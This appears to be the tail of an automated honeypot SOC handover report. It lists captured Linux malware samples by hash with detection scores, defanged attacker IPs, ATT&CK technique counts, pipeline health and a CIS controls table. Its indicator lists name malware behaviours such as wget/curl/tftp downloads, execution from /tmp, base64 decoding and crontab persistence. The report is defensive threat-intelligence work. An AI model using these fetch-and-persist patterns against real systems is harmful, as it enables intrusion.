| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 63/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `417e065ee49c19c83c0e9cd99b702efde39d77b6c02d56b69a6c56b93d275ff3` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `417e065ee49c19c8...` | 47/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `178.178.222[.]61` | RU | PJSC MegaFon | **100** ⚠️ | 50 |
| `208.109.38[.]143` | US | GoDaddy.com, LLC | **100** ⚠️ | 50 |
| `78.187.9[.]111` | TR | Turk Telekomunikasyon Anonim Sirketi | **100** ⚠️ | 50 |
| `176.170.1[.]244` | FR | Bouygues Telecom Division Mobile | **100** ⚠️ | 33 |
| `123.212.9[.]122` | KR | SK Broadband Co Ltd | **100** ⚠️ | 50 |
| `45.205.1[.]241` | BR | VPSVAULT.HOST LTD | **100** ⚠️ | 50 |
| `132.148.30[.]167` | US | GoDaddy.com, LLC | **100** ⚠️ | 24 |
| `166.62.102[.]109` | US | GoDaddy.com, LLC | **100** ⚠️ | 23 |
| `218.23.95[.]14` | CN | CHINANET Anhui province network | **100** ⚠️ | 50 |
| `178.178.194[.]134` | RU | Metropolitan branch of PJSC MegaFon | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 56 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 50 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 6 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 3 |

---

## 🔕 False Positive Summary (19 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 14 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 143 cases |
| Tool 34  | Credential Extractor        | ✅ 66 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 67 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 19 filtered (13.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 52 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 27 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 50 priority case(s) shown individually · 19 recon entry/entries in table (6 group(s) consolidating 61 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-29T23:02:09Z_
